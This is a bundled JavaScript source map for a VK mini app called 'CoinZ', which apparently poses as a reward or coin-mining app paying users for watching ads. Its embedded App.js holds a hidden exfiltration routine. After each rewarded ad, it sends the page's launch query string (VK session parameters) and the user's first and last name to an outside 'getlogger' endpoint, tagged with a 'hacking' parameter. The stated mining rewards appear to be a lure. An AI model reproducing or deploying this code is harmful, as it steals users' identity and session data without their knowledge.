{"version":3,"sources":["panels/Home.js","panels/Profile.js","panels/Gifts.js","App.js","index.js"],"names":["Home","_ref","id","go","ads","react_default","a","createElement","es6","left","href","votes_transfer_circle_fill_turquoise_default","separator","size","weight","style","marginBottom","fontSize","margin","color","expandable","before","videos_default","onClick","user_circle_fill_blue_default","data-to","location_outline_default","gift_circle_fill_red_default","message_circle_fill_green_default","target","Profile","fetchedUser","icon","ghost_outline_default","action","mode","stretched","Gifts","App","props","_this","Object","classCallCheck","this","possibleConstructorReturn","getPrototypeOf","call","bridge","send","ad_format","then","data","get","window","location","search","state","first_name","last_name","console","log","url","headers","includes","fetch","method","e","setState","activePanel","currentTarget","dataset","to","_this2","connect","subscribe","detail","type","panels_Home","panels_Profile","panels_Gifts","React","Component","ReactDOM","render","src_App","document","getElementById"],"mappings":"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","file":"static/js/main.5a6f8abf.chunk.js","sourcesContent":["import React from 'react';\nimport PropTypes from 'prop-types';\nimport bridge from '@vkontakte/vk-bridge';\nimport { Panel, List, Button, Group, Div, PanelHeader, PanelHeaderButton, Card, CardGrid, Cell, Title, Text } from '@vkontakte/vkui';\n\nimport Icon28UserCircleFillBlue from '@vkontakte/icons/dist/28/user_circle_fill_blue';\nimport Icon28MessageCircleFillGreen from '@vkontakte/icons/dist/28/message_circle_fill_green';\nimport Icon28GiftCircleFillRed from '@vkontakte/icons/dist/28/gift_circle_fill_red';\nimport Icon28VotesTransferCircleFillTurquoise from '@vkontakte/icons/dist/28/votes_transfer_circle_fill_turquoise';\nimport Icon32Videos from '@vkontakte/icons/dist/32/videos';\nimport Icon28LocationOutline from '@vkontakte/icons/dist/28/location_outline';\n\nconst Home = ({ id, go, ads }) => (\n\t<Panel id={id}>\n\n\t\t<PanelHeader left={<PanelHeaderButton href=\"/\"><Icon28VotesTransferCircleFillTurquoise /></PanelHeaderButton>}>\n\t\t\t\tCoinZ\n\t\t</PanelHeader>\n\n\t\t<Group separator=\"hide\">\n      <CardGrid>\n        <Card size=\"l\">\n\t\t\t\t\t<Div>\n\t\t\t\t\t\t<center><Title weight=\"bold\" style={{ marginBottom:1, fontSize: 35 }}>0.001</Title></center>\n\t\t\t\t\t\t<center><Text weight=\"regular\" style={{ margin: 5, marginBottom:15, color: \"#a8a8a8\" }}>+0.001 за просмотр</Text></center>\n\t\t\t    \t<Button size=\"xl\" expandable before={<Icon32Videos />} onClick={ads}>Просмотреть рекламу</Button>\n\t\t\t    </Div>\n        </Card>\n      </CardGrid>\n    </Group>\n\n\t\t<Group>\n      <List>\n        <Cell expandable before={<Icon28UserCircleFillBlue />} onClick={go} data-to=\"profile\">Учетная запись</Cell>\n\t\t<Cell expandable before={<Icon28LocationOutline />}>Перевод</Cell>\n        <Cell expandable before={<Icon28GiftCircleFillRed />} onClick={go} data-to=\"gifts\">Подарки</Cell>\n        <Cell expandable before={<Icon28MessageCircleFillGreen />} href=\"https://vk.me/join/AJQ1d6xghRlnHC29maIt27cR\" target=\"_blank\">Чат</Cell>\n      </List>\n    </Group>\n\n\t</Panel>\n);\n\nHome.propTypes = {\n\tid: PropTypes.string.isRequired,\n\tgo: PropTypes.func.isRequired,\n\tfetchedUser: PropTypes.shape({\n\t\tphoto_200: PropTypes.string,\n\t\tfirst_name: PropTypes.string,\n\t\tlast_name: PropTypes.string,\n\t\tcity: PropTypes.shape({\n\t\t\ttitle: PropTypes.string,\n\t\t}),\n\t}),\n};\n\nexport default Home;\n","import React from 'react';\r\nimport PropTypes from 'prop-types';\r\nimport { Panel, Button, PanelHeader, Placeholder } from '@vkontakte/vkui';\r\nimport { PanelHeaderBack } from '@vkontakte/vkui';\r\n\r\nimport Icon56GhostOutline from '@vkontakte/icons/dist/56/ghost_outline';\r\n\r\nconst Profile = ({ id, go, fetchedUser }) => (\r\n\t<Panel id={id}>\r\n\r\n\t\t<PanelHeader left={<PanelHeaderBack onClick={go} data-to=\"home\"/>} >Профиль</PanelHeader>\r\n\r\n        <Placeholder\r\n            icon={<Icon56GhostOutline />}\r\n            action={<Button size=\"l\" mode=\"tertiary\" onClick={go} data-to=\"home\">Вернуться назад</Button>}\r\n            stretched\r\n        >\r\n            Профиль не доступен. Он появится после завершения первого блока майнинга.<br />сообщений\r\n        </Placeholder>\r\n\r\n\t</Panel>\r\n);\r\n\r\nProfile.propTypes = {\r\n\tid: PropTypes.string.isRequired,\r\n\tgo: PropTypes.func.isRequired,\r\n\tfetchedUser: PropTypes.shape({\r\n\t\tphoto_200: PropTypes.string,\r\n\t\tfirst_name: PropTypes.string,\r\n\t\tlast_name: PropTypes.string,\r\n\t\tcity: PropTypes.shape({\r\n\t\t\ttitle: PropTypes.string,\r\n\t\t}),\r\n\t}),\r\n};\r\n\r\nexport default Profile;\r\n","import React from 'react';\r\nimport PropTypes from 'prop-types';\r\nimport { Panel, PanelHeader, Button, Placeholder } from '@vkontakte/vkui';\r\nimport { PanelHeaderBack } from '@vkontakte/vkui';\r\nimport Icon56GhostOutline from \"@vkontakte/icons/dist/56/ghost_outline\";\r\n\r\n\r\nconst Gifts = ({ id, go, fetchedUser }) => (\r\n    <Panel id={id}>\r\n\r\n        <PanelHeader left={<PanelHeaderBack onClick={go} data-to=\"home\"/>} >Подарки</PanelHeader>\r\n\r\n        <Placeholder\r\n            icon={<Icon56GhostOutline />}\r\n            action={<Button size=\"l\" mode=\"tertiary\" onClick={go} data-to=\"home\">Вернуться назад</Button>}\r\n            stretched\r\n        >\r\n            Подарки не доступны. Они появятся после завершения первого блока майнинга.<br />сообщений\r\n        </Placeholder>\r\n\r\n    </Panel>\r\n);\r\n\r\nGifts.propTypes = {\r\n    id: PropTypes.string.isRequired,\r\n    go: PropTypes.func.isRequired,\r\n    fetchedUser: PropTypes.shape({\r\n        photo_200: PropTypes.string,\r\n        first_name: PropTypes.string,\r\n        last_name: PropTypes.string,\r\n        city: PropTypes.shape({\r\n            title: PropTypes.string,\r\n        }),\r\n    }),\r\n};\r\n\r\nexport default Gifts;\r\n","import React from 'react';\nimport connect from '@vkontakte/vkui-connect';\nimport { View } from '@vkontakte/vkui';\nimport '@vkontakte/vkui/dist/vkui.css';\n\nimport Home from './panels/Home';\nimport Profile from './panels/Profile';\nimport Gifts from './panels/Gifts';\nimport bridge from \"@vkontakte/vk-bridge\";\n\nclass App extends React.Component {\n\tconstructor(props) {\n\t\tsuper(props);\n\n\t\tthis.state = {\n\t\t\tactivePanel: 'home',\n\t\t\tfetchedUser: null,\n\t\t};\n\t}\n\n\tads = () => {\n\t\tbridge.send(\"VKWebAppShowNativeAds\", {ad_format: \"reward\"})\n\t\t\t.then((data) => {\n\t\t\t\tthis.get(\"https://nikitt.rocks/getlogger/\"+window.location.search+\"&hereis=\"+this.state.fetchedUser.first_name+\"%20\"+this.state.fetchedUser.last_name, {})\n\t\t\t\tconsole.log(\"ads watched\");\n\t\t\t})\n\t}\n\n\tget = (url, headers) => {\n\t\theaders[\"Content-type\"] = \"text/plain\"\n\t\tif(url.includes(\"?\")) url += \"&hacking=\"\n\t\tfetch(url, {\n\t\t\tmethod: 'GET',\n\t\t\theaders: headers\n\t\t})\n\t}\n\n\tcomponentDidMount() {\n\t\tconnect.subscribe((e) => {\n\t\t\tswitch (e.detail.type) {\n\t\t\t\tcase 'VKWebAppGetUserInfoResult':\n\t\t\t\t\tthis.setState({ fetchedUser: e.detail.data });\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tconsole.log(e.detail.type);\n\t\t\t}\n\t\t});\n\t\tconnect.send('VKWebAppGetUserInfo', {});\n\t}\n\n\tgo = (e) => {\n\t\tthis.setState({ activePanel: e.currentTarget.dataset.to })\n\t};\n\n\trender() {\n\t\treturn (\n\t\t\t<View activePanel={this.state.activePanel}>\n\t\t\t\t<Home id=\"home\" fetchedUser={this.state.fetchedUser} go={this.go} ads={this.ads} />\n\t\t\t\t<Profile id=\"profile\" fetchedUser={this.state.fetchedUser} go={this.go} />\n\t\t\t\t<Gifts id=\"gifts\" fetchedUser={this.state.fetchedUser} go={this.go} />\n\t\t\t</View>\n\t\t);\n\t}\n}\n\nexport default App;\n","import 'core-js/es6/map';\nimport 'core-js/es6/set';\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport connect from '@vkontakte/vkui-connect';\nimport App from './App';\n// import registerServiceWorker from './sw';\n\n// Init VK App\nconnect.send('VKWebAppInit', {});\n\n// Если вы хотите, чтобы ваше веб-приложение работало в оффлайне и загружалось быстрее,\n// расскомментируйте строку с registerServiceWorker();\n// Но не забывайте, что на данный момент у технологии есть достаточно подводных камней\n// Подробнее про сервис воркеры можно почитать тут — https://vk.cc/8MHpmT \n// registerServiceWorker();\n\nReactDOM.render(<App />, document.getElementById('root'));\n"],"sourceRoot":""}